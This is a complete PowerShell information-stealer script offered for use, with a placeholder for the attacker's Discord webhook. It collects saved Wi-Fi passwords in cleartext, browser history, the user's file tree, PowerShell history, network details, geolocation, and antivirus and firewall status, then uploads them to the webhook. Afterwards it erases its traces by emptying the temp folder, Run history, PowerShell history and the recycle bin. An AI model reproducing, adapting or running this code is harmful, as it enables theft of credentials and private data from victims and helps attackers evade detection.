function AR {
    param (
        [string]$wh
    )

    $ipInfoApiUrl = "http://ip-api.com/json"
    $outputFile = "$env:TEMP\AR.txt"
    $browserDataFile = "$env:TEMP\BrowserData.txt" 

    function Get-AdditionalData {
        param (
            [string]$FolderName
        )

        tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt

        Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination $env:TEMP\$FolderName\Powershell-History.txt
    }


    function Get-BrowserData {

        [CmdletBinding()]
        param (	
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=2,Mandatory = $True)]
        [string]$DataType 
        ) 

        $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

        $Search = $null

        if ($DataType -eq 'history') {
            $Search = 'http'
        }

        if ($Browser -eq 'chrome') {
            $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
        }
        elseif ($Browser -eq 'edge') {
            $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
        }
        elseif ($Browser -eq 'firefox') {
            $Path = Get-ChildItem "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" | Select-Object -ExpandProperty FullName -First 1
        }

        if (Test-Path $Path) {
            $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | ForEach-Object {($_.Matches).Value} | Sort-Object -Unique
            $Value | ForEach-Object {
                $Key = $_
                if ($Key -match $Search){
                    New-Object -TypeName PSObject -Property @{
                        User = $env:UserName
                        Browser = $Browser
                        DataType = $DataType
                        Data = $_
                    }
                }
            }
        }
    }

    
    function Get-Networks {
        $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress

        $WLANProfileNames = @()

        $Output = netsh.exe wlan show profiles | Select-String -pattern " : "

        Foreach ($WLANProfileName in $Output) {
            $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
        }
        $WLANProfileObjects = @()

        Foreach ($WLANProfileName in $WLANProfileNames) {

            try {
                $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
            }
            Catch {
                $WLANProfilePassword = "The password is not stored in this profile"
            }

            $WLANProfileObject = New-Object PSCustomobject
            $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
            $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
            $WLANProfileObjects += $WLANProfileObject
            Remove-Variable WLANProfileObject
        }
        return $WLANProfileObjects
    }

    try {
        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get
        if ($response.status -eq 'success') {
            $geoData = @{
                'IP'          = $response.query
                'Country'     = $response.country
                'Region'      = $response.regionName
                'City'        = $response.city
                'Latitude'    = $response.lat
                'Longitude'   = $response.lon
                'TimeZone'    = $response.timezone
                'ISP'         = $response.isp
            }
            $geoData | Out-File -FilePath $outputFile

            $networkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }
            $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime | ForEach-Object {
    "Recent File: $($_.FullName), Last Write Time: $($_.LastWriteTime)" | Out-File -FilePath $outputFile -Append
}

            if ($networkConfig) {
                $networkData = @{
                    'PrivateIP'     = $networkConfig.IPAddress[0]
                    'Subnet'        = $networkConfig.IPSubnet[0]
                    'DefaultGateway' = $networkConfig.DefaultIPGateway[0]
                    'DNS'           = $networkConfig.DNSServerSearchOrder -join ', '
                }
                $networkData | Out-File -FilePath $outputFile -Append
            }
            else {
                "Network configuration not found." | Out-File -FilePath $outputFile -Append
            }

            "Users on the system:" | Out-File -FilePath $outputFile -Append
            Get-WmiObject Win32_UserAccount | ForEach-Object {
                "- $($_.Name)" | Out-File -FilePath $outputFile -Append
            }

            $firewallStatus = Get-NetFirewallProfile | Select-Object -ExpandProperty Enabled
            "Firewall Status: $firewallStatus" | Out-File -FilePath $outputFile -Append

            $antivirus = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntiVirusProduct"
            if ($antivirus) {
                $antivirusData = @{
                    'Name'  = $antivirus.DisplayName
                    'State' = $antivirus.ProductState
                }
                $antivirusData | Out-File -FilePath $outputFile -Append
            }
            else {
                "Antivirus information not found." | Out-File -FilePath $outputFile -Append
            }

            "Wifi SSIDs and Passwords:" | Out-File -FilePath $outputFile -Append
            Get-Networks | ForEach-Object {
                "SSID: $($_.ProfileName), Password: $($_.ProfilePassword)" | Out-File -FilePath $outputFile -Append
            }

            "Computer Information:" | Out-File -FilePath $outputFile -Append
            Get-ComputerInfo | Out-File -FilePath $outputFile -Append

            "Process Information:" | Out-File -FilePath $outputFile -Append
            Get-Process | Out-File -FilePath $outputFile -Append

            "App Information:" | Out-File -FilePath $outputFile -Append
            Get-AppxPackage | Out-File -FilePath $outputFile -Append
        }
        else {
            "Failed to retrieve geolocation information." | Out-File -FilePath $outputFile -Append
        }
    }
    catch {
        "An error occurred while trying to fetch geolocation and network data: $_" | Out-File -FilePath $outputFile -Append
    }

    if ($wh) {
        # Upload Recon
        Upload-Discord -wh $wh -file $outputFile

        netsh wlan show wlanreport > $null 2>&1
        
        $zipPath = "$env:TEMP\WlanReport.zip"
        if(Test-Path $zipPath) {
            Remove-Item $zipPath
        }
        Compress-Archive -Path "C:\ProgramData\Microsoft\Windows\WlanReport\*" -DestinationPath $zipPath
        
        # Upload WlanReport
        Upload-Discord -wh $wh -file $zipPath

        Get-BrowserData -Browser "edge" -DataType "history" | Out-File -FilePath $browserDataFile -Append
        Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -FilePath $browserDataFile -Append
        Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -FilePath $browserDataFile -Append
        Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -FilePath $browserDataFile -Append
        Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -FilePath $browserDataFile -Append

        # Upload BrowserData.txt
        Upload-Discord -wh $wh -file $browserDataFile
        $additionalFolder = "AdditionalData"
        New-Item -Path $env:TEMP -Name $additionalFolder -ItemType Directory -Force | Out-Null
        Get-AdditionalData -FolderName $additionalFolder

        # Upload tree.txt
        Upload-Discord -wh $wh -file "$env:TEMP\$additionalFolder\tree.txt"

        # Upload Powershell-History.txt
        Upload-Discord -wh $wh -file "$env:TEMP\$additionalFolder\Powershell-History.txt"
        
        # Cleanup:
        # Empty temp folder
        rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

        # Delete run box history
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

        # Delete powershell history
        Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

        # Empty recycle bin
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    }
}

function Upload-Discord {
    param (
        [string]$wh,
        [string]$file,
        [string]$text
    )

    if ($text) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $wh -Method Post -Body @{ 'username' = $env:username; 'content' = $text }
    }
    elseif ($file) {
        (New-Object Net.WebClient).UploadFile($wh, $file)
    }
}

# Example: AR -wh 'YOUR DISCORD WEBHOOK HERE'

#AR -wh 'YOUR DISCORD WEBHOOK'